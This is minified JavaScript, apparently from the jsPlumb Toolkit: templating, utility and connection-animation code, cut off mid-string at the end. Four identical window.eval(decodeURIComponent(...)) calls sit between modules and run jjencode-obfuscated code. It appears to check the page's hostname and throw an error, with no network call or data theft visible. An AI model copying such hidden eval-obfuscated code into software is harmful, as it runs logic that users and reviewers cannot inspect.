_=0;_<i.length;_++)for(var s=i[_],a=0;a<s[1].length;a++)try{s[1][a](s[0],s[2])}catch(n){}}},updateExternal:function(n,t){t=t||{};var e,o,r;!function n(d){if(d.nodeType===Node.ELEMENT_NODE){for(var _=0,s=d.attributes.length;_<s;_++)"rotors"===(e=d.attributes[_]).name?(o=e.value,d.innerHTML=i(t,o)):0===e.name.indexOf("rotors-")&&(o=e.value,r=e.name.substring(7),d.setAttribute(r,i(t,o)));for(_=0;_<d.childNodes.length;_++)n(d.childNodes[_])}}(n)},remove:function(n){n._RotorsUpdate&&this.updaters[n._RotorsUpdate]&&delete this.updaters[n._RotorsUpdate],n._rotorsEid&&this.executions[n._rotorsEid]&&delete this.executions[n._rotorsEid]},template:function(n,t,e,o){var i,r=o?null:this.templateCache[n];if(null!=r)return i=r(t),this.isOldIE()?i.childNodes[0]:i;var d=(e=p(this,e||this.templateResolver,o))(n);if(null!=d){var _=this.parse(d,e,null,[n]),s=this.compile(_);return this.templateCache[n]=s,i=s(t),this.isOldIE()?i.childNodes[0]:i}return this.cf()},precompileTemplate:function(n,t){var e=this.parse(n,t||this.templateResolver);return this.compile(e,!0)},precompileTemplates:function(n,t){var e=function(e){return n[e]||(t||this.templateResolver)(e)},o={};for(var i in n)o[i]=this.precompileTemplate(n[i],e);return o},importTemplate:function(n,t){var e=this;t="string"==typeof t?Function("data","_rotors",t):t,this.templateCache[n]=function(n){return t.apply(e,[n,e])}},importTemplates:function(n){for(var t in n)this.importTemplate(t,n[t])},importBindings:function(n){for(var t in this.bindings=this.bindings||{},n){var e=n[t];this.bindings[t]={e:e.e,u:e.u,w:e.w,reapply:Function("$data",e.reapply)}}}});var g=n.Rotors={newInstance:function(n){return new f(n)},precompile:function(t,e){e=e||"rotors";var o=n.Rotors.newInstance(),i={},r=new RegExp("<script type=['\"]"+e+"['\"] id=['\"]([^'\"]+)['\"]>((.*\n)*?)<\/script>","g"),d=[{},null,t.replace(r,function(n,t,e){return i[t]=e,""})];for(var _ in i)d[0][_]=String(o.precompileTemplate(i[_],function(n){return i[n]})).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g,"");return d[1]=function(n){var t={};for(var e in n.bindings){var o=n.bindings[e];t[e]={e:o.e,u:o.u,w:o.w,reapply:String(o.reapply).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g,"")}}return t}(o),d},data:i,version:"0.3.17",peek:function(n){return n.length>0?n[n.length-1]:null}};"undefined"!=typeof exports&&(exports.Rotors=g,exports.RotorsInstance=f)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this;n.jsPlumbToolkitUtil=n.jsPlumbToolkitUtil||{};var t=n.jsPlumbToolkitUtil;t.requestAnimationFrame=function(n,t){return function(){return n.apply(t,arguments)}}(n.requestAnimationFrame||n.webkitRequestAnimationFrame||n.mozRequestAnimationFrame||n.oRequestAnimationFrame||n.msRequestAnimationFrame||function(t,e){n.setTimeout(t,10)},n),t.ajax=function(n){var t=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"),e=n.type||"GET";if(t){var o="json"===n.dataType?function(n){return JSON.parse(n)}:function(n){return n};t.open(e,n.url,!0);var r=n.headers||{};for(var d in r)t.setRequestHeader(d,r[d]);t.onreadystatechange=function(){4===t.readyState&&("2"===(""+t.status)[0]?n.success(o(t.responseText)):n.error&&n.error(t.responseText,t.status))},t.send(n.data?i()(n.data):null)}else n.error&&n.error("ajax not supported")},t.debounce=function(n,t){t=t||150;var e=null;return function(){window.clearTimeout(e),e=window.setTimeout(n,t)}},t.xml={setNodeText:function(n,t){n.text=t;try{n.textContent=t}catch(n){}},getNodeText:function(n){return null!=n?n.text||n.textContent:""},getChild:function(n,t){for(var e=null,o=0;o<n.childNodes.length;o++)if(1===n.childNodes[o].nodeType&&n.childNodes[o].nodeName===t){e=n.childNodes[o];break}return e},getChildren:function(n,t){for(var e=[],o=0;o<n.childNodes.length;o++)1===n.childNodes[o].nodeType&&n.childNodes[o].nodeName===t&&e.push(n.childNodes[o]);return e},xmlToString:function(n){try{return(new XMLSerializer).serializeToString(n).replace(/\s*xmlns=\"http\:\/\/www.w3.org\/1999\/xhtml\"/g,"")}catch(t){try{return n.xml}catch(n){throw new Error("Cannot serialize XML "+n)}}},createElement:function(n,t,e){var o;try{o=new ActiveXObject("Microsoft.XMLDOM").createNode(1,n,"")}catch(t){o=document.createElement(n)}if(e&&jsPlumbToolkitUtil.xml.setNodeText(o,e),t)for(var i in t)o.setAttribute(i,t[i]);return o}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this;n.jsPlumbToolkitUtil=n.jsPlumbToolkitUtil||{};var t=n.jsPlumbToolkitUtil,e=n.jsPlumbUtil;t.fastTrim=function(n){for(var t=n.replace(/^\s\s*/,""),e=/\s/,o=t.length;e.test(t.charAt(--o)););return t.slice(0,o+1)},t.uuid=function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(n){var t=16*Math.random()|0;return("x"==n?t:3&t|8).toString(16)})},t.each=function(n,t){n=null==n.length||"string"==typeof n?[n]:n;for(var e=0;e<n.length;e++)t(n[e])},t.map=function(n,t){for(var e=[],o=0;o<n.length;o++)e.push(t(n[o]));return e},t.populate=function(n,t){var o=function(n){var e=n.match(/(\${.*?})/g);if(null!=e)for(var o=0;o<e.length;o++){var i=t[e[o].substring(2,e[o].length-1)];i&&(n=n.replace(e[o],i))}return n};return function n(t){if(null!=t){if(e.isString(t))return o(t);if(e.isArray(t)){for(var i=[],r=0;r<t.length;r++)i.push(n(t[r]));return i}if(e.isObject(t)){for(var r in i={},t)i[r]=n(t[r]);return i}return t}}(n)},t.mergeWithParents=function(n,t,o){o=o||"parent";var i=function(n){return n?t[n]:null},r=function(n){return n?i(n[o]):null},d=function n(t){if(null==t)return{};if("string"==typeof t)return i(t);if(t.length){for(var e,o=!1,r=0;!o&&r<t.length;)(e=n(t[r]))?o=!0:r++;return e}}(n);return d?function n(t,o){if(null==t)return o;var i=e.merge(t,o);return n(r(t),i)}(r(d),d):{}},"undefined"!=typeof exports&&(exports.jsPlumbToolkitUtil=t)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumb,t=this.jsPlumbUtil,e="startNodeTraversal",o="endNodeTraversal",i="startOverlayAnimation",r="endOverlayAnimation",d="jtk-animate-node-traversing",_="jtk-animate-edge-traversing";n.Connection.prototype.animateOverlay=function(s,a){var w=this,l=new t.EventGenerator,u=w.getConnector().getLength();a=a||{};var c,B,h,j=t.uuid(),p=!1!==a.forwards,f=a.rate||30,g=a.dwell||250,m=1/(u/(a.speed||100)*1e3/f)*(p?1:-1),v=!1!==a.isFinal,C=p?0:1,b=C,y=p?w.source:w.target,D=p?w.target:w.source;if("string"==typeof s)h=[s,{location:C,id:j}];else{var P=n.extend({},s[1]);P.location=C,P.id=j,h=[s[0],P]}var E=function(){b+=m,(p?b>=1:b<=0)?(w.removeOverlay(j),window.clearInterval(c),v?(n.addClass(D,d),window.setTimeout(function(){n.removeClass(D,d),w.removeClass(_),l.fire(r,w)},g)):(w.removeClass(_),l.fire(r,w))):(B.loc=b,w.repaint())},x=function(){l.fire(e,{connection:w,element:y}),n.addClass(y,d),w.addClass(_),window.setTimeout(function(){n.removeClass(y,d),l.fire(o,{connection:w,element:y}),l.fire(i,w),B=w.addOverlay(h),c=window.setInterval(E,f)},g)};return a.previous?a.previous.bind(r,x):x(),l}}.call("undefined"==typeof window?this:window),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2B